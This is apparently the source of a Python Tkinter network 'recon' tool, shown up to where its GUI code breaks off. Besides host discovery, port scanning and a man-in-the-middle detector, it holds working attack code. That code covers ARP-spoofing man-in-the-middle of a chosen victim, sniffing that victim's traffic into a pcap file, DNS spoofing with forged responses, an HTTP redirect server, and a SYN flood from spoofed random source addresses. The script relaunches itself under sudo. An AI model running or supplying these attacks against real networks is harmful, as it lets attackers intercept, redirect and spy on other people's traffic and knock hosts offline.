import sys
import subprocess
import os
import socket
import ipaddress
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import threading
import webbrowser
import time
import json
import http.server
import socketserver
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from datetime import datetime
import shutil 

# --- 0. FILE & VENV SETUP ---

SCRIPT_NAME = "recon_tool.py"
VENV_DIR = "venv_recon"
VENV_BIN = os.path.join(VENV_DIR, 'bin') if os.name != 'nt' else os.path.join(VENV_DIR, 'Scripts')
PYTHON_EXECUTABLE = os.path.join(VENV_BIN, 'python') if os.name != 'nt' else os.path.join(VENV_BIN, 'python.exe')
REQUIRED_PACKAGES = ["scapy"]

def setup_and_run():
    """
    Checks if running in VENV. If not, creates VENV, installs dependencies,
    and relaunches the script inside the VENV.
    """
    is_in_venv = hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix)
    
    if is_in_venv and VENV_DIR in sys.prefix:
        print("[*] Running inside VENV. Proceeding to main execution.")
        main_application()
        return

    print(f"[*] Virtual environment ({VENV_DIR}) not active.")
    
    # --- VENV Creation ---
    if not os.path.isdir(VENV_DIR):
        print(f"[!] Creating virtual environment: {VENV_DIR}...")
        try:
            subprocess.check_call([sys.executable, "-m", "venv", VENV_DIR])
            print("[+] VENV created successfully.")
        except subprocess.CalledProcessError:
            print("[!!! FATAL ERROR !!!] Failed to create VENV. Ensure Python's 'venv' module is available.")
            sys.exit(1)

    # --- Dependency Installation ---
    print(f"[*] Installing required packages: {', '.join(REQUIRED_PACKAGES)}...")
    try:
        subprocess.check_call([PYTHON_EXECUTABLE, "-m", "pip", "install", *REQUIRED_PACKAGES])
        print("[+] Dependencies installed successfully.")
    except subprocess.CalledProcessError:
        print(f"[!!! FATAL ERROR !!!] Failed to install packages in VENV. Check permissions.")
        sys.exit(1)

    # 3. Relaunch the script inside the new VENV
    print("[*] Relaunching script inside the virtual environment...")
    
    try:
        run_with_privileges = False
        if os.name != 'nt' and os.geteuid() != 0:
            run_with_privileges = True
            
        command = [PYTHON_EXECUTABLE, os.path.abspath(__file__)]
        
        if run_with_privileges:
            print("[!] Relaunching with 'sudo' for network access...")
            subprocess.call(['sudo'] + command)
        else:
            subprocess.call(command)

    except Exception as e:
        print(f"[!!! FATAL ERROR !!!] Could not relaunch script: {e}")
        sys.exit(1)

    sys.exit(0)


# --- 1. CORE MODULES & CONFIG ---

scapy = None 

# Mapping common hostnames/keywords to simple service names (Used in Sniffer)
SERVICE_MAP = {
    'facebook.com': 'Using Facebook',
    'fbcdn.net': 'Using Facebook (Content)',
    'instagram.com': 'Using Instagram',
    'cdninstagram.com': 'Using Instagram (Content)',
    'whatsapp.com': 'Using WhatsApp',
    'google.com': 'Using Google/Search',
    'youtube.com': 'Watching YouTube',
    'netflix.com': 'Watching Netflix',
    'amazon.com': 'Using Amazon',
    'ebay.com': 'Using eBay',
    'twitter.com': 'Using X (Twitter)',
    'reddit.com': 'Using Reddit',
    'apple.com': 'Using Apple Services',
    'microsoft.com': 'Using Microsoft Services',
}

# Revised and Expanded MAC OUI (Vendor) Map
OUI_MAP = {
    # Routers/Modems
    '00:0E:8E': 'D-Link (Router)', '00:13:B8': 'Netgear (Router)', '00:19:D1': 'Linksys (Router)',
    '00:1C:C0': 'Huawei (Router)', '3C:F8:70': 'Cisco/Linksys (Router)', '50:C7:BF': 'TPLink (Router)',
    '00:03:7E': 'Cisco/Scientific Atlanta', '00:1A:80': 'Motorola (Modem)',
    # Devices
    '00:00:00': 'Xerox', '00:00:0C': 'Cisco', '00:05:9A': 'Intel', '00:0C:29': 'VMware',
    '00:1A:A9': 'Apple', '00:1B:44': 'Dell', '00:1C:23': 'HP', '00:1E:C9': 'TP-Link',
    '00:21:27': 'Samsung', '00:23:4E': 'Microsoft', '00:26:BB': 'ASUSTek', '00:2A:43': 'Sony',
    '00:30:18': 'Linksys', '08:00:20': 'Sun', '14:98:77': 'Xiaomi', '28:60:46': 'Intel',
    '3C:97:0E': 'Google', '40:8D:5C': 'Amazon', '48:D2:24': 'Huawei', '54:B8:0A': 'Technicolor',
    '5C:F9:38': 'Google', '68:7B:F7': 'LG', '70:3E:AC': 'Tenda', '84:38:38': 'Netgear',
    '90:A4:DE': 'TP-Link', '9C:B6:D0': 'Apple', 'A4:14:37': 'D-Link', 'B4:0E:D7': 'Samsung',
    'D8:32:14': 'Cisco', 'E0:F6:C6': 'Samsung', 'E4:95:6E': 'Apple', 'F8:46:1C': 'Xiaomi',
    'F8:4A:BF': 'Apple', 'FC:A9:B0': 'TPLink'
}

def import_scapy_module():
    """ Loads scapy after installation is confirmed. """
    global scapy
    try:
        # Import Scapy first
        import scapy.all as scapy_module
        scapy = scapy_module
        
        # FIX: Now that scapy is loaded, we can set its config safely.
        # This line prevents Scapy from doing lengthy or conflicting IP checks on interfaces.
        scapy.conf.checkIPaddr = False 
        
        # Import custom modules
        try:
            from logger import init_logger, get_logger
            from network_intel import NetworkIntelligence
            from report_generator import ReportGenerator, create_scan_data_structure
            
            # Store in globals for access
            globals()['init_logger'] = init_logger
            globals()['get_logger'] = get_logger
            globals()['NetworkIntelligence'] = NetworkIntelligence
            globals()['ReportGenerator'] = ReportGenerator
            globals()['create_scan_data_structure'] = create_scan_data_structure
        except ImportError as ie:
            print(f"[!] Warning: Could not import custom modules: {ie}")
            print("[!] Some features may be limited.")
        
        return True
    except ImportError:
        messagebox.showerror("Error", "Scapy import failed unexpectedly after installation. Re-run setup.")
        return False
    except Exception as e:
         messagebox.showerror("Scapy Init Error", f"Scapy module initialization error: {e}")
         return False


# --- 2. CONFIGURATION AND UTILITIES ---

def load_config(config_file="config.json"):
    """Load configuration from JSON file"""
    default_config = {
        "scan_settings": {
            "default_ports": [21, 22, 23, 80, 443, 554, 3389, 8080, 8554],
            "scan_timeout": 0.1,
            "max_threads": 20,
            "arp_timeout": 1
        },
        "ui_settings": {
            "theme": "dark",
            "auto_scan_on_startup": False
        },
        "logging": {
            "level": "INFO",
            "max_file_size_mb": 10
        }
    }
    
    try:
        if os.path.exists(config_file):
            with open(config_file, 'r') as f:
                config = json.load(f)
                # Merge with defaults
                for key in default_config:
                    if key not in config:
                        config[key] = default_config[key]
                return config
    except Exception as e:
        print(f"[!] Could not load config: {e}. Using defaults.")
    
    return default_config

def check_network_connectivity():
    """Check if network is accessible"""
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=2)
        return True
    except OSError:
        return False

def set_ip_forwarding(value):
    """
    Enable/Disable IP Forwarding (Linux only)
    value: 1 to enable, 0 to disable
    """
    if os.name == 'nt':
        return # Windows support not implemented here
        
    try:
        current_val = -1
        with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
            current_val = int(f.read().strip())
            
        if current_val != value:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(str(value))
            if 'get_logger' in globals():
                get_logger().info('SYSTEM', f"IP Forwarding set to {value}")
    except Exception as e:
        print(f"[!] Failed to set IP forwarding: {e}")


# --- 3. NETWORK HELPER FUNCTIONS ---

def get_hostname_by_ip(ip):
    """ Performs a reverse DNS lookup to get the hostname. """
    try:
        socket.setdefaulttimeout(0.5) 
        hostname = socket.gethostbyaddr(ip)[0]
        return hostname
    except socket.error:
        return "Unknown Hostname"
    except Exception:
        return "N/A"
    finally:
        socket.setdefaulttimeout(None) # Reset default

def get_vendor_by_mac(mac):
    """ Looks up the vendor name using the first 3 octets (OUI) of the MAC address. """
    if not mac or mac == "N/A":
        return "Unknown Vendor"
        
    oui = mac[:8].upper() # Get first three octets: XX:XX:XX
    return OUI_MAP.get(oui, "Unknown Vendor")

def get_gateway_info():
    """ 
    Uses scapy to find the local IP, local IP range, gateway IP, and gateway MAC.
    Also gets the local machine's MAC address.
    Returns: (local_ip, local_ip_range, gateway_ip, gateway_mac, local_mac)
    """
    if scapy is None:
        return "N/A", "N/A", "N/A", "N/A", "N/A"
        
    local_mac = "N/A (Failed to retrieve)"
    try:
        local_mac = scapy.get_if_hwaddr(scapy.conf.iface)
    except Exception as e:
        print(f"[!] Warning: Could not retrieve local MAC address: {e}")

    try:
        gateway_ip = scapy.conf.route.route('0.0.0.0')[2]
        
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        
        network = ipaddress.ip_network(f'{local_ip}/24', strict=False)
        local_ip_range = str(network)

        # ARP ping the gateway to get its MAC
        arp_request = scapy.ARP(pdst=gateway_ip)
        broadcast_ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast_ether / arp_request
        
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        
        gateway_mac = "N/A (Failed to get MAC)"
        if answered_list:
            gateway_mac = answered_list[0][1].hwsrc
            
        return local_ip, local_ip_range, gateway_ip, gateway_mac, local_mac
        
    except Exception as e:
        print(f"[!] Could not determine network info: {e}")
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
        except:
             local_ip = "127.0.0.1"
             
        return local_ip, "192.168.1.1/24", "N/A", "N/A", local_mac

def start_browser(ip, port=80):
    """ Opens the identified stream in the default web browser. """
    print(f"[*] Redirecting to potential stream at: http://{ip}:{port}")
    webbrowser.open(f"http://{ip}:{port}")


# --- 4. CORE SCANNING AND ATTACK LOGIC (THREADS) ---

class MitmDetectorThread(threading.Thread):
    def __init__(self, app, gateway_ip, true_gateway_mac):
        super().__init__()
        self.app = app
        self.gateway_ip = gateway_ip
        self.true_gateway_mac = true_gateway_mac
        self.stop_event = threading.Event()

    def run(self):
        print(f"[*] MITM Detector started. True MAC: {self.true_gateway_mac}")
        sniff_filter = f"arp and host {self.gateway_ip}"
        
        def arp_callback(packet):
            if packet.haslayer(scapy.ARP) and packet[scapy.ARP].psrc == self.gateway_ip:
                source_mac = packet[scapy.ARP].hwsrc
                
                if source_mac != self.true_gateway_mac:
                    self.stop_sniffing()
                    self.app.mitm_alert(self.gateway_ip, source_mac, self.true_gateway_mac)
        
        scapy.sniff(filter=sniff_filter, prn=arp_callback, stop_filter=lambda x: self.stop_event.is_set(), store=0)
        print("[*] MITM Detector stopped.")

    def stop_sniffing(self):
        self.stop_event.set()


class MitmSnifferThread(threading.Thread):
    def __init__(self, app, victim_ip, pcap_path="capture.pcap"):
        super().__init__()
        self.app = app
        self.victim_ip = victim_ip
        self.stop_event = threading.Event()
        self.sniffed_data = []
        self.pcap_path = pcap_path
        self.pcap_writer = None

    def run(self):
        print(f"[*] MITM Sniffer started. Monitoring traffic for {self.victim_ip}...")
        sniff_filter = f"ip and (host {self.victim_ip})"
        
        # Initialize PCAP Writer
        try:
            self.pcap_writer = scapy.PcapWriter(self.pcap_path, append=False, sync=True)
        except Exception as e:
            print(f"[!] Could not init PCAP writer: {e}")
        
        def packet_callback(packet):
            if self.stop_event.is_set():
                return
            
            # Save packet to PCAP
            if self.pcap_writer:
                try:
                    self.pcap_writer.write(packet)
                except:
                    pass
            
            if packet.haslayer(scapy.IP) and (packet.haslayer(scapy.TCP) or packet.haslayer(scapy.UDP)):
                src_ip = packet[scapy.IP].src
                dst_ip = packet[scapy.IP].dst
                
                layer = packet[scapy.TCP] if packet.haslayer(scapy.TCP) else packet[scapy.UDP]
                src_port = layer.sport
                dst_port = layer.dport
                
                simplified_info = None

                # HTTP and Service Recognition (Port 80)
                if dst_port == 80 and packet.haslayer(scapy.Raw):
                    try:
                        raw_data = str(packet[scapy.Raw].load)
                        if "GET" in raw_data or "POST" in raw_data:
                            host_line = next((line for line in raw_data.split('\\r\\n') if 'Host:' in line), None)
                            if host_line:
                                host = host_line.split('Host:')[1].strip().lower()
                                simplified_info = f"[HTTP] {src_ip} -> {host} (Request)"
                            else:
                                simplified_info = f"[HTTP] {src_ip} -> {dst_ip} (Raw)"
                    except Exception:
                        pass
                            
                # Other Protocols
                elif dst_port in [21, 22, 23, 443]:
                    protocol = "HTTPS" if dst_port == 443 else ("FTP" if dst_port == 21 else ("SSH" if dst_port == 22 else "Telnet"))
                    simplified_info = f"[{protocol}] {src_ip} -> {dst_ip}:{dst_port} Traffic"
                
                # DNS (UDP 53)
                elif dst_port == 53 or src_port == 53:
                    if packet.haslayer(scapy.DNSQR):
                        qname = packet[scapy.DNSQR].qname.decode('utf-8', errors='ignore')
                        simplified_info = f"[DNS] {src_ip} query: {qname}"

                # General Traffic Fallback (if no specific protocol matched but it's relevant)
                if not simplified_info and (dst_port < 1024 or src_port < 1024):
                     simplified_info = f"[TCP/UDP] {src_ip}:{src_port} -> {dst_ip}:{dst_port}"

                if simplified_info:
                    from datetime import datetime # Added import for datetime
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    final_msg = f"[{timestamp}] {simplified_info}"
                    self.app.master.after(0, lambda: self.app.add_sniffer_result(final_msg))

        # Start sniffing
        self.app.master.after(0, lambda: self.app.add_sniffer_result(f"[*] SNIFFER STARTED for {self.victim_ip}..."))
        try:
            scapy.sniff(filter=sniff_filter, prn=packet_callback, stop_filter=lambda x: self.stop_event.is_set(), store=0)
        except Exception as e:
            self.app.master.after(0, lambda: self.app.add_sniffer_result(f"[!] Sniffer Error: {e}"))

        print("[*] MITM Sniffer stopped.")

    def stop_sniffing(self):
        self.stop_event.set()
        if self.pcap_writer:
            try:
                self.pcap_writer.close()
            except:
                pass


class ArpSpooferThread(threading.Thread):
    def __init__(self, app, target_ip, gateway_ip, target_mac, gateway_mac):
        super().__init__()
        self.app = app
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = target_mac
        self.gateway_mac = gateway_mac
        self.stop_event = threading.Event()
        self.spoof_mac = scapy.get_if_hwaddr(scapy.conf.iface) # Attacker's (Your) MAC

    def run(self):
        print(f"[*] ARP Spoofing started: Target={self.target_ip}, Gateway={self.gateway_ip}")
        self.app.update_status(f"!!! ATTACK IN PROGRESS: Spoofing {self.target_ip} and {self.gateway_ip} !!!")
        
        # Enable IP Forwarding
        set_ip_forwarding(1)
        if 'get_logger' in globals():
            get_logger().info('ATTACK', f"Spoofing started: {self.target_ip} <-> {self.gateway_ip}")
        
        try:
            while not self.stop_event.is_set():
                # Spoof Victim (Tell Victim: Gateway MAC is Attacker's MAC)
                packet1 = scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, 
                                    psrc=self.gateway_ip, hwsrc=self.spoof_mac)
                scapy.send(packet1, verbose=False)

                # Spoof Gateway (Tell Gateway: Victim MAC is Attacker's MAC)
                packet2 = scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                                    psrc=self.target_ip, hwsrc=self.spoof_mac)
                scapy.send(packet2, verbose=False)
                
                self.stop_event.wait(2)
                
        except Exception as e:
            print(f"[!!!] ARP Spoofing Error: {e}")
            if 'get_logger' in globals():
                get_logger().error('ATTACK', f"ARP spoofing error: {e}")
            self.app.master.after(0, lambda: messagebox.showerror("Attack Error", f"ARP Spoofing failed: {e}"))
            
        finally:
            self.restore_network()
            self.app.master.after(0, lambda: self.app.stop_attack_ui())


    def restore_network(self):
        """ CRITICAL: Sends true ARP packets to restore correct network routing. """
        print("[*] Restoring network...")
        if 'get_logger' in globals():
            get_logger().info('ATTACK', "Restoring network config")
        
        # Disable IP Forwarding
        set_ip_forwarding(0)
        
        # 1. Restore Victim's ARP table
        packet1 = scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, 
                            psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        scapy.send(packet1, count=7, verbose=False)

        # 2. Restore Gateway's ARP table
        packet2 = scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                            psrc=self.target_ip, hwsrc=self.target_mac)
        scapy.send(packet2, count=7, verbose=False)
        
        print("[*] Network restored.")

    def stop_spoofing(self):
        self.stop_event.set()


class DnsSpooferThread(threading.Thread):
    def __init__(self, app, target_ip, spoof_map=None):
        super().__init__()
        self.app = app
        self.target_ip = target_ip
        self.spoof_map = spoof_map or {} # {'example.com': '192.168.1.5'}
        self.stop_event = threading.Event()
        self.local_ip = app.local_ip
        
    def run(self):
        print(f"[*] DNS Spoofing started for {self.target_ip}")
        if 'get_logger' in globals():
            get_logger().info('ATTACK', f"DNS Spoofing started for {self.target_ip}")
            
        # Filter for DNS traffic from target
        sniff_filter = f"udp port 53 and host {self.target_ip}"
        
        def dns_callback(packet):
            if packet.haslayer(scapy.DNSQR):
                qname = packet[scapy.DNSQR].qname.decode('utf-8')
                
                # Check if query matches any domain in our map
                # Or if we want to spoof everything (simplistic mode)
                should_spoof = False
                spoof_ip = self.local_ip
                
                # Clean qname (remove trailing dot)
                clean_qname = qname.rstrip('.')
                
                for domain, ip in self.spoof_map.items():
                    if domain in clean_qname:
                        should_spoof = True
                        spoof_ip = ip
                        break
                
                if should_spoof:
                    # Create spoofed response
                    spoofed_pkt = scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst) / \
                                  scapy.UDP(dport=packet[scapy.UDP].sport, sport=packet[scapy.UDP].dport) / \
                                  scapy.DNS(id=packet[scapy.DNS].id, qr=1, aa=1, qd=packet[scapy.DNS].qd,
                                            an=scapy.DNSRR(rrname=packet[scapy.DNSQR].qname, ttl=10, rdata=spoof_ip))
                    
                    scapy.send(spoofed_pkt, verbose=False)
                    msg = f"[DNS SPOOF] {clean_qname} -> {spoof_ip}"
                    print(msg)
                    self.app.master.after(0, lambda: self.app.add_sniffer_result(msg))
                    if 'get_logger' in globals():
                        get_logger().warning('ATTACK', msg)

        try:
            scapy.sniff(filter=sniff_filter, prn=dns_callback, stop_filter=lambda x: self.stop_event.is_set(), store=0)
        except Exception as e:
            print(f"[!] DNS Spoofing Error: {e}")
            if 'get_logger' in globals():
                get_logger().error('ATTACK', f"DNS error: {e}")
                
    def stop_spoofing(self):
        self.stop_event.set()


class HttpRedirectThread(threading.Thread):
    def __init__(self, app, redirect_url, port=80):
        super().__init__()
        self.app = app
        self.redirect_url = redirect_url
        self.port = port
        self.stop_event = threading.Event()
        self.httpd = None

    def run(self):
        print(f"[*] HTTP Redirect Server started on port {self.port} -> {self.redirect_url}")
        
        class RedirectHandler(http.server.BaseHTTPRequestHandler):
            def do_GET(self_inner):
                self_inner.send_response(302)
                self_inner.send_header('Location', self.redirect_url)
                self_inner.end_headers()
                
            def do_POST(self_inner):
                self_inner.send_response(302)
                self_inner.send_header('Location', self.redirect_url)
                self_inner.end_headers()
                
            def log_message(self_inner, format, *args):
                pass # Suppress default logging

        try:
            # Allow reusing address to avoid "Address already in use" errors on restart
            socketserver.TCPServer.allow_reuse_address = True
            self.httpd = socketserver.TCPServer(("", self.port), RedirectHandler)
            
            # Non-blocking check for stop_event
            self.httpd.timeout = 1
            while not self.stop_event.is_set():
                self.httpd.handle_request()
                
        except Exception as e:
            print(f"[!] HTTP Redirect Server Error: {e}")
            self.app.master.after(0, lambda: messagebox.showerror("Redirect Error", f"Could not bind port {self.port}. Run as root?\nError: {e}"))
            
        print("[*] HTTP Redirect Server stopped.")

    def stop_server(self):
        self.stop_event.set()
        if self.httpd:
            self.httpd.server_close()


class SynFloodThread(threading.Thread):
    def __init__(self, app, target_ip, target_port=80):
        super().__init__()
        self.app = app
        self.target_ip = target_ip
        self.target_port = target_port
        self.stop_event = threading.Event()

    def run(self):
        print(f"[*] SYN Flood started against {self.target_ip}:{self.target_port}")
        self.app.update_status(f"!!! FLOODING {self.target_ip}:{self.target_port} !!!")
        
        while not self.stop_event.is_set():
            try:
                # Spoof random source IP and port
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                src_port = random.randint(1024, 65535)
                
                # Create SYN packet
                ip_layer = scapy.IP(src=src_ip, dst=self.target_ip)
                tcp_layer = scapy.TCP(sport=src_port, dport=self.target_port, flags="S", seq=random.randint(1000, 9000))
                packet = ip_layer / tcp_layer
                
                scapy.send(packet, verbose=False)
            except Exception:
                pass
                
        self.app.update_status("Ready.")
        print("[*] SYN Flood stopped.")

    def stop_flood(self):
        self.stop_event.set()


class ScannerThread(threading.Thread):
    def __init__(self, ip_range, app, custom_ports):
        super().__init__()
        self.ip_range = ip_range
        self.app = app
        self.scan_result = []
        self.custom_ports = custom_ports 

    def run(self):
        self.app.update_status("Starting ARP Scan...")
        
        try:
            # ARP Scan Setup
            arp_request = scapy.ARP(pdst=self.ip_range)
            broadcast_ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast_ether / arp_request
            
            # Send and Capture Responses
            answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            
            total_ips = 256
            self.scan_result = []
            
            # Simulate progress bar update
            for i in range(total_ips):
                progress = int((i / total_ips) * 80)
                self.app.update_progress(progress, f"Checking IP {i+1} of {total_ips}...")
                
                # Check answers
                for sent, received in answered_list:
                    if ipaddress.ip_address(received.psrc).packed[-1] == i + 1:
                        
                        ip = received.psrc
                        mac = received.hwsrc
                        
                        # --- IDENTIFICATION LOGIC ---
                        vendor = get_vendor_by_mac(mac)
                        hostname = get_hostname_by_ip(ip)

                        client_dict = {
                            "IP": ip, 
                            "MAC": mac, 
                            "Vendor": vendor,
                            "Hostname": hostname
                        }
                        
                        if client_dict not in self.scan_result: 
                             self.scan_result.append(client_dict)

            self.app.update_status(f"ARP Scan Complete. Found {len(self.scan_result)} devices.")
            self.app.display_results(self.scan_result)
            
            # Port Scanning
            self.port_scan_and_check()

        except Exception as e:
            self.app.update_status("Scan Failed!")
            error_message = f"Network Scan Error. Ensure privileges are sufficient.\nError: {e}"
            messagebox.showerror("Scan Error", error_message)
            self.app.stop_scan_ui()


    def port_scan_and_check(self):
        """ Enhanced parallel port scanning with network intelligence """
        self.app.update_status("Starting Enhanced Port Scan...")
        
        ports_to_scan = self.custom_ports
        
        if not ports_to_scan:
             ports_to_scan = [80, 443, 554, 8080, 8554]
        
        # Initialize network intelligence if available
        net_intel = None
        try:
            if 'NetworkIntelligence' in globals():
                net_intel = NetworkIntelligence(scapy)
        except:
            pass
        
        total_checks = len(self.scan_result) * len(ports_to_scan)
        check_count = [0]  # Use list for mutable counter in nested function
        
        def scan_port(ip, port):
            """Scan a single port with retry logic"""
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.15)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                check_count[0] += 1
                progress = 80 + int((check_count[0] / total_checks) * 20)
                self.app.update_progress(progress, f"Scanned {check_count[0]}/{total_checks} ports...")
                
                if result == 0:
                    return (ip, port, True)
                return (ip, port, False)
            except Exception:
                return (ip, port, False)
        
        # Parallel port scanning
        max_workers = min(20, len(self.scan_result) * len(ports_to_scan))
        open_ports_map = {}  # Store open ports per IP
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            for client in self.scan_result:
                ip = client['IP']
                open_ports_map[ip] = []
                for port in ports_to_scan:
                    futures.append(executor.submit(scan_port, ip, port))
            
            # Collect results
            for future in as_completed(futures):
                try:
                    ip, port, is_open = future.result()
                    if is_open:
                        open_ports_map[ip].append(port)
                        
                        # Add camera button for streaming ports
                        if port in [80, 554, 8080, 8554]:
                            self.app.add_camera_button(ip, port)
                except Exception:
                    pass
        
        # Perform network intelligence gathering
        if net_intel:
            self.app.update_status("Gathering network intelligence...")
            for client in self.scan_result:
                ip = client['IP']
                open_ports = open_ports_map.get(ip, [])
                
                if open_ports:
                    # OS Detection
                    try:
                        os_info = net_intel.detect_os_by_ttl(ip, timeout=0.5)
                        if os_info:
                            client['OS'] = os_info
                    except:
                        client['OS'] = 'Unknown'
                    
                    # Service Detection
                    client['open_ports'] = open_ports
                    client['services'] = {}
                    client['vulnerabilities'] = []
                    
                    for port in open_ports[:5]:  # Limit to first 5 ports to avoid slowdown
                        try:
                            service_info = net_intel.detect_service(ip, port)
                            client['services'][port] = service_info
                            
                            # Get vulnerability hints
                            vulns = net_intel.get_vulnerability_hints(service_info)
                            if vulns:
                                client['vulnerabilities'].extend(vulns)
                        except:
                            pass

        self.app.update_status("Scan Complete. Ready.")
        self.app.stop_scan_ui()


# --- 5. GUI APPLICATION (TKINTER) ---

class CyberReconApp:
    def __init__(self, master):
        self.master = master
        master.title("Advanced Python Cyber Recon Tool v2.0")
        
        # Load configuration
        self.config = load_config()
        
        # Initialize logging
        try:
            if 'init_logger' in globals():
                self.logger = init_logger(
                    log_dir=self.config['logging'].get('log_directory', 'logs'),
                    max_bytes=self.config['logging'].get('max_file_size_mb', 10) * 1024 * 1024
                )
                self.logger.info('SYSTEM', 'Recon Tool started')
            else:
                self.logger = None
        except Exception as e:
            print(f"[!] Could not initialize logger: {e}")
            self.logger = None
        
        # Initialize report generator
        try:
            if 'ReportGenerator' in globals():
                self.report_gen = ReportGenerator()
            else:
                self.report_gen = None
        except:
            self.report_gen = None
        
        self.local_ip, self.ip_range, self.gateway_ip, self.gateway_mac, self.local_mac = get_gateway_info()
        
        if self.logger:
            self.logger.info('NETWORK', f'Local IP: {self.local_ip}, Gateway: {self.gateway_ip}')
        
        self.scan_thread = None
        self.spoofer_thread = None
        self.sniffer_thread = None
        self.mitm_detector = None
        self.dns_spoofer_thread = None
        self.redirect_thread = None
        self.syn_flood_thread = None
        self.mac_map = {}
        self.scan_results = []  # Store results for export

        # Ensure the Gateway and Local IP/MAC are in the map for attack logic consistency
        if self.gateway_ip != "N/A" and self.gateway_mac != "N/A (Failed to get MAC)":
             self.mac_map[self.gateway_ip] = self.gateway_mac
        if self.local_ip != "N/A":
             self.mac_map[self.local_ip] = self.local_mac
             
        # Start MITM Detector if gateway MAC is known
        if self.gateway_mac != "N/A (Failed to get MAC)":
             self.mitm_detector = MitmDetectorThread(self, self.gateway_ip, self.gateway_mac)
             self.mitm_detector.start()
             if self.logger:
                 self.logger.info('SECURITY', 'MITM detector started')

        self.create_widgets()
        master.protocol("WM_DELETE_WINDOW", self.on_close) 

    def create_widgets(self):
        self.setup_theme()
        
        # --- Main Container ---
        # Use a main frame to hold everything
        main_frame = ttk.Frame(self.master)
        main_frame.pack(fill='both', expand=True)

        # --- Settings Frame (Top, Fixed) ---
        settings_frame = ttk.Frame(main_frame, padding="5")
        settings_frame.pack(fill='x')
        
        # ROW 1: Local and Gateway Status
        status_row1 = ttk.Frame(settings_frame)
        status_row1.pack(fill='x')
        ttk.Label(status_row1, text=f"Scanner IP: {self.local_ip}").pack(side='left', padx=(0, 20))
        ttk.Label(status_row1, text=f"Scanner MAC: {self.local_mac}").pack(side='left', padx=(0, 20))
        
        gateway_mac_color = 'red' if 'Failed' in self.gateway_mac else 'black'
        gateway_label = ttk.Label(status_row1, text=f"Gateway MAC: {self.gateway_mac}")
        gateway_label.pack(side='right', padx=(0, 0))
        gateway_label.configure(foreground=gateway_mac_color)


        # ROW 2: Range and Ports
        status_row2 = ttk.Frame(settings_frame)
        status_row2.pack(fill='x', pady=5)
        ttk.Label(status_row2, text=f"Network Range: {self.ip_range}").pack(side='left', padx=(0, 20))

        ttk.Label(status_row2, text="Custom Ports:").pack(side='left')
        self.port_entry = ttk.Entry(status_row2, width=25)
        self.port_entry.insert(0, "21, 22, 80, 443, 3389")
        self.port_entry.pack(side='left', padx=10)
        
        # Export buttons
        ttk.Button(status_row2, text="📄 Export JSON", command=self.export_json).pack(side='right', padx=2)
        ttk.Button(status_row2, text="📊 Export CSV", command=self.export_csv).pack(side='right', padx=2)
        ttk.Button(status_row2, text="🌐 Export HTML", command=self.export_html).pack(side='right', padx=2)
        
        self.start_button = ttk.Button(status_row2, text="Start Scan", command=self.start_scan)
        self.start_button.pack(side='right', padx=5)

        # --- Status & Progress (Fixed below settings) ---
        status_frame = ttk.Frame(main_frame, padding="5")
        status_frame.pack(fill='x')
        
        self.status_label = ttk.Label(status_frame, text="Status: Ready to scan.")
        self.status_label.pack(fill='x')

        self.progress_bar = ttk.Progressbar(status_frame, orient='horizontal', length=400, mode='determinate')
        self.progress_bar.pack(fill='x', pady=5)

        # --- PanedWindow (Split Attack and Results) ---
        self.paned_window = ttk.PanedWindow(main_frame, orient='vertical')
        self.paned_window.pack(fill='both', expand=True, padx=5, pady=5)

        # --- Attack Frame (Top Pane) ---
        attack_frame = ttk.LabelFrame(self.paned_window, text="🕵️ Ethical Hacking Options", padding="10")
        self.paned_window.add(attack_frame, weight=1)
        
        # Controls Sub-frame (Spoofing)
        spoofing_frame = ttk.LabelFrame(attack_frame, text="1. ARP Spoofing (MITM) Attack", padding="5")
        spoofing_frame.pack(fill='x', pady=5)
        
        ttk.Label(spoofing_frame, text="Target (Victim) IP:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.target_ip_entry = ttk.Entry(spoofing_frame, width=20)
        self.target_ip_entry.grid(row=0, column=1, padx=5, pady=5, sticky='w')
        
        # Styles are handled in setup_theme()
        
        self.start_attack_button = ttk.Button(spoofing_frame, text="START SPOOFING", command=self.start_attack, style='Danger.TButton')
        self.start_attack_button.grid(row=0, column=2, padx=10, pady=5)
        
        self.stop_attack_button = ttk.Button(spoofing_frame, text="STOP & RESTORE", command=self.stop_attack, state=tk.DISABLED, style='Success.TButton')
        self.stop_attack_button.grid(row=0, column=3, padx=5, pady=5)

        # DNS Spoofing Frame
        dns_frame = ttk.LabelFrame(attack_frame, text="2. DNS Spoofing", padding="5")
        dns_frame.pack(fill='x', pady=5)
        
        self.dns_var = tk.BooleanVar()
        ttk.Checkbutton(dns_frame, text="Enable DNS Spoofing", variable=self.dns_var).grid(row=0, column=0, padx=5)
        
        ttk.Label(dns_frame, text="Spoof Domain:").grid(row=0, column=1, padx=5)
        self.spoof_domain_entry = ttk.Entry(dns_frame, width=20)
